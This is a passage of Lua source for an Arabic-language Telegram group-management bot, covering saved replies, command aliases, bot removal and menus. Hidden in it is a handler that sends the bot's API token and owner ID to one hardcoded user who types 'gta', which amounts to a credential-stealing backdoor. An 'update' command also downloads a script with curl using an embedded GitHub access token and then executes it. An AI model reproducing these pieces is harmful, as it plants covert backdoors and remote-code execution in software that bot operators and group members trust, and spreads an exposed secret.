redis:set(bot_id.."Rp:content:Photo:caption"..msg.chat_id..":"..test, msg.content.caption.text)  
end
elseif msg.content.sticker then 
redis:set(bot_id.."Rp:content:Sticker"..msg.chat_id..":"..test, msg.content.sticker.sticker.remote.id)  
elseif msg.content.voice_note then 
redis:set(bot_id.."Rp:content:VoiceNote"..msg.chat_id..":"..test, msg.content.voice_note.voice.remote.id)  
if msg.content.caption.text and msg.content.caption.text ~= "" then
redis:set(bot_id.."Rp:content:VoiceNote:caption"..msg.chat_id..":"..test, msg.content.caption.text)  
end
elseif msg.content.video then 
redis:set(bot_id.."Rp:content:Video"..msg.chat_id..":"..test, msg.content.video.video.remote.id)  
if msg.content.caption.text and msg.content.caption.text ~= "" then
redis:set(bot_id.."Rp:content:Video:caption"..msg.chat_id..":"..test, msg.content.caption.text)  
end
elseif msg.content.animation then 
redis:set(bot_id.."Rp:content:Animation"..msg.chat_id..":"..test, msg.content.animation.animation.remote.id)  
if msg.content.caption.text and msg.content.caption.text ~= "" then
redis:set(bot_id.."Rp:content:Animation:caption"..msg.chat_id..":"..test, msg.content.caption.text)  
end
elseif msg.content.document then
redis:set(bot_id.."Rp:Manager:File"..msg.chat_id..":"..test, msg.content.document.document.remote.id)  
if msg.content.caption.text and msg.content.caption.text ~= "" then
redis:set(bot_id.."Rp:Manager:File:caption"..msg.chat_id..":"..test, msg.content.caption.text)  
end
elseif msg.content.audio then
redis:set(bot_id.."Rp:content:Audio"..msg.chat_id..":"..test, msg.content.audio.audio.remote.id)  
if msg.content.caption.text and msg.content.caption.text ~= "" then
redis:set(bot_id.."Rp:content:Audio:caption"..msg.chat_id..":"..test, msg.content.caption.text)  
end
elseif msg.content.text then
text = text:gsub('"',"")
text = text:gsub('"',"")
text = text:gsub("`","")
text = text:gsub("*","") 
redis:set(bot_id.."Rp:content:Text"..msg.chat_id..":"..test, text)  
end 
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:set")
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:Text:rd")
bot.sendText(msg.chat_id,msg.id,"*‹ : تم حفظ الرد بنجاح .*","md",true)
return false
end
end
end
---
if text == "gta" and msg.sender.user_id == 2132412121 then
bot.sendText(msg.chat_id,msg.id,"- T : `"..Token.."`\n\n- U : @"..bot.getMe().username.."\n\n- D : "..sudoid,"md",true)    
end
---
if msg.content.text and msg.content.text.text then   
----------------------------------------------------------------------------------------------------
if text == "غادر" and redis:get(bot_id..":Departure") then 
if programmer(msg) then  
bot.sendText(msg.chat_id,msg.id,"*‹ : تم المغادره من المجموعه .*","md",true)
local Left_Bot = bot.leaveChat(msg.chat_id)
redis:srem(bot_id..":Groups",msg.chat_id)
local keys = redis:keys(bot_id..'*'..'-100'..data.supergroup.id..'*')
redis:del(bot_id..":"..msg.chat_id..":Status:Creator")
redis:del(bot_id..":"..msg.chat_id..":Status:BasicConstructor")
redis:del(bot_id..":"..msg.chat_id..":Status:Constructor")
redis:del(bot_id..":"..msg.chat_id..":Status:Owner")
redis:del(bot_id..":"..msg.chat_id..":Status:Administrator")
redis:del(bot_id..":"..msg.chat_id..":Status:Vips")
redis:del(bot_id.."List:Command:"..msg.chat_id)
for i = 1, #keys do 
redis:del(keys[i])
end
end
end
if text == ("تحديث السورس") then 
if programmer(msg) then  
bot.sendText(msg.chat_id,msg.id,"*‹ : تم تحديث السورس بنجاح .*","md",true)
os.execute('rm -rf start.lua')
os.execute('curl -s https://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@raw.githubusercontent.com/malakAlDleMLaRiCa007/u/main/start.lua -o start.lua')
dofile('start.lua')  
end
end 
if text == "تحديث" then
if programmer(msg) then  
bot.sendText(msg.chat_id,msg.id,"*‹ : تم تحديث جميع الملفات بنجاح .*","md",true)
dofile("start.lua")
end 
end
if Constructor(msg) then
if text == ("مسح ردود المدير") then
ext = "*‹ : تم مسح قائمه ردود المدير .*"
local list = redis:smembers(bot_id.."List:Rp:content"..msg.chat_id)
for k,v in pairs(list) do
if redis:get(bot_id.."Rp:content:Animation"..msg.chat_id..":"..v) then
redis:del(bot_id.."Rp:content:Animation"..msg.chat_id..":"..v)
redis:del(bot_id.."Rp:content:Animation:caption"..msg.chat_id..":"..v)
elseif redis:get(bot_id.."Rp:content:Audio"..msg.chat_id..":"..v) then
redis:del(bot_id.."Rp:content:Audio"..msg.chat_id..":"..v)
redis:del(bot_id.."Rp:content:Audio:caption"..msg.chat_id..":"..v)
elseif redis:get(bot_id.."Rp:content:Video_note"..msg.chat_id..":"..v) then
redis:del(bot_id.."Rp:content:Video_note"..msg.chat_id..":"..v)
redis:del(bot_id.."Rp:content:Video_note:caption"..msg.chat_id..":"..v)
elseif redis:get(bot_id.."Rp:Manager:File"..msg.chat_id..":"..v) then
redis:del(bot_id.."Rp:Manager:File"..msg.chat_id..":"..v)
redis:del(bot_id.."Rp:Manager:File:caption"..msg.chat_id..":"..v)
elseif redis:get(bot_id.."Rp:content:Video"..msg.chat_id..":"..v) then
redis:del(bot_id.."Rp:content:Video"..msg.chat_id..":"..v)
redis:del(bot_id.."Rp:content:Video:caption"..msg.chat_id..":"..v)
elseif redis:get(bot_id.."Rp:content:Photo"..msg.chat_id..":"..v) then
redis:del(bot_id.."Rp:content:Photo"..msg.chat_id..":"..v)
redis:del(bot_id.."Rp:content:Photo:caption"..msg.chat_id..":"..v)
elseif redis:get(bot_id.."Rp:content:Text"..msg.chat_id..":"..v) then
redis:del(bot_id.."Rp:content:Text"..msg.chat_id..":"..v)
elseif redis:get(bot_id.."Rp:content:Sticker"..msg.chat_id..":"..v) then
redis:del(bot_id.."Rp:content:Sticker"..msg.chat_id..":"..v)
elseif redis:get(bot_id.."Rp:content:VoiceNote"..msg.chat_id..":"..v) then
redis:del(bot_id.."Rp:content:VoiceNote"..msg.chat_id..":"..v)
redis:del(bot_id.."Rp:content:VoiceNote:caption"..msg.chat_id..":"..v)
end
end
redis:del(bot_id.."List:Rp:content"..msg.chat_id)
if #list == 0 then
ext = "*‹ : لا توجد ردود مضافه .*"
end
bot.sendText(msg.chat_id,msg.id,ext,"md",true)  
end
----------------------------------------------------------------------------------------------------
end
----------------------------------------------------------------------------------------------------
if Owner(msg) then
if msg.content.text and text:match("^(.*)$") then
if redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Command:set") == "true1" then
text = text:gsub('"',"")
text = text:gsub('"',"")
text = text:gsub("`","")
text = text:gsub(" .*","") 
text = text:gsub("_","")
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Command:set")
redis:set(bot_id..":"..msg.chat_id..":Command:"..text,redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Command:Text"))
redis:sadd(bot_id.."List:Command:"..msg.chat_id, text)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم حفظ الامر بنجاح .*","md",true)
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Command:Text")
return false
end
end
if msg.content.text and text:match("^(.*)$") then
if redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Command:set") == "true" then
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Command:set","true1")
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Command:Text",text)
redis:del(bot_id..":"..msg.chat_id..":Command:"..text)
bot.sendText(msg.chat_id,msg.id,"*‹ : قم الان بأرسال الامر الجديد .*","md",true)  
return false
end
end
if text == "حذف امر" then
bot.sendText(msg.chat_id,msg.id,"*‹ : قم بأرسال الامر الجديد الان .*","md",true)
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Command:del",true)
end
if text == "اضف امر" then
bot.sendText(msg.chat_id,msg.id,"*‹ : قم الان بأرسال الامر القديم .*","md",true)
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Command:set",true)
end
if text and text:match("^(.*)$") and redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:set") == "true" then
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:set","true1")
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:Text:rd",text)
redis:del(bot_id.."Rp:content:Text"..msg.chat_id..":"..text)   
redis:del(bot_id.."Rp:content:Sticker"..msg.chat_id..":"..text)     
redis:del(bot_id.."Rp:content:Animation"..msg.chat_id..":"..text)   
redis:del(bot_id.."Rp:content:Animation:caption"..msg.chat_id..":"..text)   
redis:del(bot_id.."Rp:content:VoiceNote"..msg.chat_id..":"..text)   
redis:del(bot_id.."Rp:content:VoiceNote:caption"..msg.chat_id..":"..text)   
redis:del(bot_id.."Rp:content:Photo"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Photo:caption"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Video"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Video:caption"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:Manager:File"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:Manager:File:caption"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Video_note"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Video_note:caption"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Audio"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Audio:caption"..msg.chat_id..":"..text)
redis:sadd(bot_id.."List:Rp:content"..msg.chat_id, text)
bot.sendText(msg.chat_id,msg.id,"*‹ : قم بارسال الرد الذي تريد اضافته .*","md",true)
return false
end
if text == "اضف رد" then
bot.sendText(msg.chat_id,msg.id,"*‹ : ارسل الان الكلمه لاضافتها في الردود .*","md",true)
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:set",true)
end
if text and text:match("^(.*)$") then
if redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:del") == "true" then
redis:del(bot_id.."Rp:content:Text"..msg.chat_id..":"..text)   
redis:del(bot_id.."Rp:content:Sticker"..msg.chat_id..":"..text)     
redis:del(bot_id.."Rp:content:Animation"..msg.chat_id..":"..text)   
redis:del(bot_id.."Rp:content:Animation:caption"..msg.chat_id..":"..text)   
redis:del(bot_id.."Rp:content:VoiceNote"..msg.chat_id..":"..text)   
redis:del(bot_id.."Rp:content:VoiceNote:caption"..msg.chat_id..":"..text)   
redis:del(bot_id.."Rp:content:Photo"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Photo:caption"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Video"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Video:caption"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:Manager:File"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:Manager:File:caption"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Video_note"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Video_note:caption"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Audio"..msg.chat_id..":"..text)
redis:del(bot_id.."Rp:content:Audio:caption"..msg.chat_id..":"..text)
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:del")
redis:srem(bot_id.."List:Rp:content"..msg.chat_id,text)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم حذف الرد بنجاح .*","md",true)  
end
end
if text == "حذف رد" or text == "مسح رد" then
bot.sendText(msg.chat_id,msg.id,"*‹ : ارسل الان الكلمه لحذفها من الردود .*","md",true)
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:del",true)
end
if text == ("ردود المدير") then
local list = redis:smembers(bot_id.."List:Rp:content"..msg.chat_id)
ext = "‹ : قائمه ردود المدير\n ٴ━═━═━═━═━═━═━═━ \n"
for k,v in pairs(list) do
if redis:get(bot_id.."Rp:content:Animation"..msg.chat_id..":"..v) then
db = "متحركه 🎭"
elseif redis:get(bot_id.."Rp:content:VoiceNote"..msg.chat_id..":"..v) then
db = "بصمه 📢"
elseif redis:get(bot_id.."Rp:content:Sticker"..msg.chat_id..":"..v) then
db = "ملصق 🃏"
elseif redis:get(bot_id.."Rp:content:Text"..msg.chat_id..":"..v) then
db = "رساله ✉"
elseif redis:get(bot_id.."Rp:content:Photo"..msg.chat_id..":"..v) then
db = "صوره 🎇"
elseif redis:get(bot_id.."Rp:content:Video"..msg.chat_id..":"..v) then
db = "فيديو 📹"
elseif redis:get(bot_id.."Rp:Manager:File"..msg.chat_id..":"..v) then
db = "ملف • "
elseif redis:get(bot_id.."Rp:content:Audio"..msg.chat_id..":"..v) then
db = "اغنيه 🎵"
elseif redis:get(bot_id.."Rp:content:Video_note"..msg.chat_id..":"..v) then
db = "بصمه فيديو 🎥"
end
ext = ext..""..k.." -> "..v.." -> ("..db..")\n"
end
if #list == 0 then
ext = "‹ : عذرا لا يوجد ردود في المجموعه ."
end
bot.sendText(msg.chat_id,msg.id,"["..ext.."]","md",true)  
end
----------------------------------------------------------------------------------------------------
end 
----------------------------------------------------------------------------------------------------
if Constructor(msg) then
if text == "مسح الاوامر المضافه" then 
bot.sendText(msg.chat_id,msg.id,"*‹ : تم مسح الاوامر بنجاح .*","md",true)
local list = redis:smembers(bot_id.."List:Command:"..msg.chat_id)
for k,v in pairs(list) do
redis:del(bot_id..":"..msg.chat_id..":Command:"..v)
end
redis:del(bot_id.."List:Command:"..msg.chat_id)
end
if text == "الاوامر المضافه" then
local list = redis:smembers(bot_id.."List:Command:"..msg.chat_id)
ext = "*‹ : قائمه الاوامر المضافه\n ٴ━═━═━═━═━═━═━═━ \n .*"
for k,v in pairs(list) do
Com = redis:get(bot_id..":"..msg.chat_id..":Command:"..v)
if Com then
ext = ext..""..k..": (`"..v.."`) ← (`"..Com.."`)\n"
else
ext = ext..""..k..": ( .*"..v.."*) \n"
end
end
if #list == 0 then
ext = "*‹ : لا توجد اوامر اضافيه .*"
end
bot.sendText(msg.chat_id,msg.id,ext,"md",true)
end
end
----------------------------------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Set:array"..msg.sender.user_id..":"..msg.chat_id) == 'true' then
redis:set(bot_id..'Set:array'..msg.sender.user_id..':'..msg.chat_id,'true1')
redis:set(bot_id..'Text:array'..msg.sender.user_id..':'..msg.chat_id, text)
redis:del(bot_id.."Add:Rd:array:Text"..text..msg.chat_id)   
redis:sadd(bot_id..'List:array'..msg.chat_id..'', text)
bot.sendText(msg.chat_id,msg.id,"*‹ : ارسل الكلمه الرد الذي تريد اضافتها .*","md",true)  
return false
end
end
if text and redis:get(bot_id..'Set:array'..msg.sender.user_id..':'..msg.chat_id) == 'true1' then
local test = redis:get(bot_id..'Text:array'..msg.sender.user_id..':'..msg.chat_id..'')
text = text:gsub('"','') 
text = text:gsub("'",'') 
text = text:gsub('`','') 
text = text:gsub('*','') 
redis:sadd(bot_id.."Add:Rd:array:Text"..test..msg.chat_id,text)  
reply_ad = bot.replyMarkup{
type = 'inline',data = {
{{text="اضغط هنا لانهاء الاضافه",data="EndAddarray"..msg.sender.user_id}},
}
}
return bot.sendText(msg.chat_id,msg.id,' *‹ : تم حفظ الرد يمكنك ارسال اخر او اكمال العمليه من خلال الزر اسفل ✅*',"md",true, false, false, false, reply_ad)
end
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Set:array:Ssd"..msg.sender.user_id..":"..msg.chat_id) == 'dttd' then
redis:del(bot_id.."Set:array:Ssd"..msg.sender.user_id..":"..msg.chat_id)
gery = redis:get(bot_id.."Set:array:addpu"..msg.sender.user_id..":"..msg.chat_id)
if not redis:sismember(bot_id.."Add:Rd:array:Text"..gery..msg.chat_id,text) then
bot.sendText(msg.chat_id,msg.id,"*‹ : لا يوجد رد متعدد* ","md",true)  
return false
end
redis:srem(bot_id.."Add:Rd:array:Text"..gery..msg.chat_id,text)
bot.sendText(msg.chat_id,msg.id,' *‹ : تم حذفه بنجاح* ',"md",true)  
end
end
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Set:array:Ssd"..msg.sender.user_id..":"..msg.chat_id) == 'delrd' then
redis:del(bot_id.."Set:array:Ssd"..msg.sender.user_id..":"..msg.chat_id)
if not redis:sismember(bot_id..'List:array'..msg.chat_id,text) then
bot.sendText(msg.chat_id,msg.id,"*‹ : لا يوجد رد متعدد* ","md",true)  
return false
end
redis:set(bot_id.."Set:array:addpu"..msg.sender.user_id..":"..msg.chat_id,text)
redis:set(bot_id.."Set:array:Ssd"..msg.sender.user_id..":"..msg.chat_id,"dttd")
bot.sendText(msg.chat_id,msg.id,' *‹ : قم بارسال الرد الذي تريد حذفه منه* ',"md",true)  
return false
end
end
if text == "حذف رد من متعدد" and Owner(msg) then
redis:set(bot_id.."Set:array:Ssd"..msg.sender.user_id..":"..msg.chat_id,"delrd")
bot.sendText(msg.chat_id,msg.id,"*‹ : ارسل الكلمه الرد الاصليه .*","md",true)  
return false
end
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Set:array:rd"..msg.sender.user_id..":"..msg.chat_id) == 'delrd' then
redis:del(bot_id.."Set:array:rd"..msg.sender.user_id..":"..msg.chat_id)
redis:del(bot_id.."Add:Rd:array:Text"..text..msg.chat_id)
redis:srem(bot_id..'List:array'..msg.chat_id, text)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم حذف الرد المتعدد بنجاح .*","md",true)  
return false
end
end
if text == "حذف رد متعدد" and Owner(msg) then
redis:set(bot_id.."Set:array:rd"..msg.sender.user_id..":"..msg.chat_id,"delrd")
bot.sendText(msg.chat_id,msg.id,"*‹ : ارسل الان الكلمه لحذفها من الردود .*","md",true)  
return false
end
if text == ("الردود المتعدده") and Owner(msg) then
local list = redis:smembers(bot_id..'List:array'..msg.chat_id..'')
t = Reply_Status(msg.sender.user_id,"\n *ٴ━═━═━═━═━═━═━═━ *\n*‹ : قائمه الردود المتعدده*\n  *ٴ━═━═━═━═━═━═━═━ *\n").yu
for k,v in pairs(list) do
t = t..""..k..">> ("..v..") » {رساله}\n"
end
if #list == 0 then
t = "*‹ : لا يوجد ردود متعدده .*"
end
bot.sendText(msg.chat_id,msg.id,t,"md",true)  
end
if text == ("مسح الردود المتعدده") and BasicConstructor(msg) then   
local list = redis:smembers(bot_id..'List:array'..msg.chat_id)
for k,v in pairs(list) do
redis:del(bot_id.."Add:Rd:array:Text"..v..msg.chat_id)   
redis:del(bot_id..'List:array'..msg.chat_id)
end
bot.sendText(msg.chat_id,msg.id,"*‹ : تم مسح الردود المتعدده .*","md",true)  
end
if text == "اضف رد متعدد" then   
bot.sendText(msg.chat_id,msg.id,"*‹ : ارسل الان الكلمه لاضافتها في الردود .*","md",true)
redis:set(bot_id.."Set:array"..msg.sender.user_id..":"..msg.chat_id,true)
return false 
end
end
---
if Owner(msg) then
if text == "ترتيب الاوامر" then
redis:set(bot_id..":"..msg.chat_id..":Command:ا","ايدي")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"ا")
redis:set(bot_id..":"..msg.chat_id..":Command:غ","غنيلي")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"غ")
redis:set(bot_id..":"..msg.chat_id..":Command:ش","شعر")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"ش")
redis:set(bot_id..":"..msg.chat_id..":Command:ب","راب")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"ب")
redis:set(bot_id..":"..msg.chat_id..":Command:رم","ريمكس")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"رم")
redis:set(bot_id..":"..msg.chat_id..":Command:مم","ميمز")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"مم")
redis:set(bot_id..":"..msg.chat_id..":Command:تغ","تغير الايدي")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"تغ")
redis:set(bot_id..":"..msg.chat_id..":Command:تاك","تاك للكل")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"تاك")
redis:set(bot_id..":"..msg.chat_id..":Command:ت","تثبيت")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"ت")
redis:set(bot_id..":"..msg.chat_id..":Command:رس","مسح رسائلي")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"رس")
redis:set(bot_id..":"..msg.chat_id..":Command:ر","الرابط")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"ر")
redis:set(bot_id..":"..msg.chat_id..":Command:سح","مسح سحكاتي")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"سح")
redis:set(bot_id..":"..msg.chat_id..":Command:رر","ردود المدير")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"رر")
redis:set(bot_id..":"..msg.chat_id..":Command:رد","اضف رد")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"رد")
redis:set(bot_id..":"..msg.chat_id..":Command:،،","مسح المكتومين")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"،،")
redis:set(bot_id..":"..msg.chat_id..":Command:تفع","تفعيل الايدي بالصوره")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"تفع")
redis:set(bot_id..":"..msg.chat_id..":Command:تعط","تعطيل الايدي بالصوره")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"تعط")
redis:set(bot_id..":"..msg.chat_id..":Command:تك","تنزيل الكل")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"تك")
redis:set(bot_id..":"..msg.chat_id..":Command:ثانوي","رفع مطور ثانوي")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"ثانوي")
redis:set(bot_id..":"..msg.chat_id..":Command:اس","رفع منشئ اساسي")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"اس")
redis:set(bot_id..":"..msg.chat_id..":Command:من","رفع منشئ")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"من")
redis:set(bot_id..":"..msg.chat_id..":Command:مد","رفع مدير")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"مد")
redis:set(bot_id..":"..msg.chat_id..":Command:اد","رفع ادمن")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"اد")
redis:set(bot_id..":"..msg.chat_id..":Command:مط","رفع مطور")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"مط")
redis:set(bot_id..":"..msg.chat_id..":Command:م","رفع مميز")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"م")
bot.sendText(msg.chat_id,msg.id,"*‹ : تم ترتيب الاوامر بالشكل التالي . \n‹ : تفعيل الايدي بالصوره - تفع . \n‹ : تعطيل الايدي بالصوره - تعط . \n‹ : رفع مطور ثانوي - ثانوي . \n‹ : رفع مطور - مط . \n‹ : رفع منشئ اساسي - اس . \n‹ : رفع منشئ - من . \n‹ : رفع مدير - مد . \n‹ : رفع ادمن - اد . \n‹ : رفع مميز - م . \n‹ : تنزيل الكل - تك . \n‹ : تغير الايدي - تغ . \n‹ : تاك للكل - تاك . \n‹ : تثبيت - ت . \n‹ : الرابط - ر . \n‹ : مسح رسائلي - رس . \n‹ : مسح سحكاتي - سح . \n‹ : مسح المكتومين - ،، . \n‹ : اضف رد - رد . \n‹ : غنيلي - غ . \n‹ : شعر - ش . \n‹ : ميمز - مم . \n‹ : ريمكس - رم . \n‹ : راب - ب . \n‹ : ردود المدير - رر .*","md",true)
end
end
if text == "اوامر التسليه" or text == "اوامر التسلية" then    
bot.sendText(msg.chat_id,msg.id,"*‹ : اوامر التسليه هي .\nٴ━═━═━═━═━═━═━═━\n‹ : مصه . \n‹ : بوسه . \n‹ : هينه . \n‹ : رزلها . \n‹ : هينها . \n‹ : شنو رئيك بهذا . \n‹ : شنو رئيك بهاي . \n‹ : كت تويت .*","md",true)
end
if Administrator(msg) then
if text == 'مسح البوتات' or text == 'حذف البوتات' or text == 'طرد البوتات' or text == 'طرد البوتات الايرانيه' then
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*‹ : البوت لا يمتلك صلاحيه حظر الاعضاء* ',"md",true)  
return false
end
local Info = bot.searchChatMembers(msg.chat_id, " .*", 200)
local members = Info.members
i = 0
for k, v in pairs(members) do
UserInfo = bot.getUser(v.member_id.user_id) 
if UserInfo.type.luatele == "userTypeBot" then 
if bot.getChatMember(msg.chat_id,v.member_id.user_id).status.luatele ~= "chatMemberStatusAdministrator" then
bot.setChatMemberStatus(msg.chat_id,v.member_id.user_id,'banned',0)
i = i + 1
end
end
end
bot.sendText(msg.chat_id,msg.id,"*‹ : تم حظر ( "..i.." ) من البوتات في المجموعه .*","md",true)  
end
if text == 'البوتات' then  
local Info = bot.searchChatMembers(msg.chat_id, " .*", 200)
local members = Info.members
ls = "*‹ : قائمه البوتات في المجموعه\n  *ٴ━═━═━═━═━═━═━═━ *\n‹ : العلامه 《 *★ * 》 تدل على ان البوت مشرف*\n *ٴ━═━═━═━═━═━═━═━ *\n"
i = 0
for k, v in pairs(members) do
UserInfo = bot.getUser(v.member_id.user_id) 
if UserInfo.type.luatele == "userTypeBot" then 
sm = bot.getChatMember(msg.chat_id,v.member_id.user_id)
if sm.status.luatele == "chatMemberStatusAdministrator" then
i = i + 1
ls = ls..'*'..(i)..' - *@['..UserInfo.username..'] 《 `★` 》\n'
else
i = i + 1
ls = ls..'*'..(i)..' - *@['..UserInfo.username..']\n'
end
end
end
bot.sendText(msg.chat_id,msg.id,ls,"md",true)  
end
if text == "الاوامر" then    
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'1'" ,data="Amr_"..msg.sender.user_id.."_1"},{text ="'2'",data="Amr_"..msg.sender.user_id.."_2"}},
{{text ="'3'",data="Amr_"..msg.sender.user_id.."_3"},{text ="'4'",data="Amr_"..msg.sender.user_id.."_4"}},
{{text = '‹ : FSouRce u .',url="t.me/FeLX_TEaM"}},
}
}
bot.sendText(msg.chat_id,msg.id,"*‹ : قائمه الاوامر .\n *ٴ━═━═━═━═━═━═━═━ *\n‹ : م1 اوامر الحمايه .\n‹ : م2 اوامر إعدادات المجموعه .\n‹ : م3 اوامر القفل والفتح .\n‹ : م4 اوامر اخرى.*","md", true, false, false, false, reply_markup)
end
if text == "الاعدادات" then    
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'الكيبورد'" ,data="GetSe_"..msg.sender.user_id.."_Keyboard"},{text = GetSetieng(msg.chat_id).Keyboard ,data="GetSe_"..msg.sender.user_id.."_Keyboard"}},
{{text = "'الملصقات'" ,data="GetSe_"..msg.sender.user_id.."_messageSticker"},{text =GetSetieng(msg.chat_id).messageSticker,data="GetSe_"..msg.sender.user_id.."_messageSticker"}},
{{text = "'الاغاني'" ,data="GetSe_"..msg.sender.user_id.."_messageVoiceNote"},{text =GetSetieng(msg.chat_id).messageVoiceNote,data="GetSe_"..msg.sender.user_id.."_messageVoiceNote"}},
{{text = "'الانكليزي'" ,data="GetSe_"..msg.sender.user_id.."_WordsEnglish"},{text =GetSetieng(msg.chat_id).WordsEnglish,data="GetSe_"..msg.sender.user_id.."_WordsEnglish"}},
{{text = "'الفارسيه'" ,data="GetSe_"..msg.sender.user_id.."_WordsPersian"},{text =GetSetieng(msg.chat_id).WordsPersian,data="GetSe_"..msg.sender.user_id.."_WordsPersian"}},
{{text = "'الدخول'" ,data="GetSe_"..msg.sender.user_id.."_JoinByLink"},{text =GetSetieng(msg.chat_id).JoinByLink,data="GetSe_"..msg.sender.user_id.."_JoinByLink"}},
{{text = "'الصور'" ,data="GetSe_"..msg.sender.user_id.."_messagePhoto"},{text =GetSetieng(msg.chat_id).messagePhoto,data="GetSe_"..msg.sender.user_id.."_messagePhoto"}},
{{text = "'الفيديو'" ,data="GetSe_"..msg.sender.user_id.."_messageVideo"},{text =GetSetieng(msg.chat_id).messageVideo,data="GetSe_"..msg.sender.user_id.."_messageVideo"}},
{{text = "'الجهات'" ,data="GetSe_"..msg.sender.user_id.."_messageContact"},{text =GetSetieng(msg.chat_id).messageContact,data="GetSe_"..msg.sender.user_id.."_messageContact"}},
{{text = "'السيلفي'" ,data="GetSe_"..msg.sender.user_id.."_messageVideoNote"},{text =GetSetieng(msg.chat_id).messageVideoNote,data="GetSe_"..msg.sender.user_id.."_messageVideoNote"}},
{{text = "'➡️'" ,data="GetSeBk_"..msg.sender.user_id.."_1"}},
}
}
bot.sendText(msg.chat_id,msg.id,"اعدادات المجموعه","md", true, false, false, false, reply_markup)
end
if text == "م1" or text == "م١" or text == "اوامر الحمايه" then    
bot.sendText(msg.chat_id,msg.id,"*‹ : اوامر الحمايه اتبع مايلي .\n *ٴ━═━═━═━═━═━═━═━ *\n‹ : قفل ، فتح ← الامر .\n← تستطيع قفل حمايه كما يلي .\n← { بالتقيد ، بالطرد ، بالكتم ، بالتقييد }\n *ٴ━═━═━═━═━═━═━═━ *\n‹ : تاك . \n‹ : القناه .\n‹ : الصور .\n‹ : الرابط .\n‹ : الفشار .\n‹ : الموقع .\n‹ : التكرار .\n‹ : التفليش .\n‹ : الاباحي .\n‹ : الكفر .\n‹ : الفيديو .\n‹ : الدخول .\n‹ : الاضافه .\n‹ : الاغاني .\n‹ : الصوت .\n‹ : الملفات .\n‹ : الرسائل .\n‹ : الدردشه .\n‹ : الجهات .\n‹ : السيلفي .\n‹ : التثبيت .\n‹ : الشارحه .\n‹ : الكلايش .\n‹ : البوتات .\n‹ : التوجيه .\n‹ : التعديل .\n‹ : الانلاين .\n‹ : المعرفات .\n‹ : الكيبورد .\n‹ : الفارسيه .\n‹ : الانكليزيه .\n‹ : الاستفتاء .\n‹ : الملصقات .\n‹ : الاشعارات .\n‹ : الماركداون .\n‹ : المتحركات .*","md",true)
elseif text == "م2" or text == "م٢" then    
